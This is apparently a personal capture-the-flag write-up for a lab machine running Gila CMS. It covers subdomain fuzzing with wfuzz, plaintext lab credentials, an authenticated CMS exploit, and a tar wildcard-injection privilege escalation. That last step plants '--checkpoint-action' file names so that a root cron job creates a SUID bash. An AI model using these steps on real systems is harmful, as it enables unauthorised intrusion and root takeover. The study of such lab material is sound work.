http://10.10.63.213/

```
Powered by Gila CMS

```


GILA CMD Version:
`1.10.9`

## wfuzz
#wfuzz
```
wfuzz -c -f sub-fighter -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.htm"


subdomain found: dev.cmess.thm
```

Subdomains:
`dev.cmess.thm`
## Credentials found
```
andre@cmess.thm
KPFTN_f2yxe%
```
use creds above to login to /admin

## Exploit found 
authenticated explloit using andre's login to the CMS application
https://www.exploit-db.com/exploits/51569

Shell access  as `www-data`

```
www-data@cmess:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

## Credentials found using linpeas
```
www-data@cmess:/var/www/html/tmp$ cat /opt/.password.bak 
andres backup password
UQfsdCB7aAP6
```

## ssh as andre
```
andre@cmess:~/backup$ sudo -l
[sudo] password for andre: 
Sorry, user andre may not run sudo on cmess.
```

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > ./backup/shell.sh
touch /home/andre/backup/--checkpoint=1
touch /home/andre/backup/--checkpoint-action=exec='sh ./shell.sh'

# wait for cron job to run by root
$ /tmp/bash -p
# whoami
root
```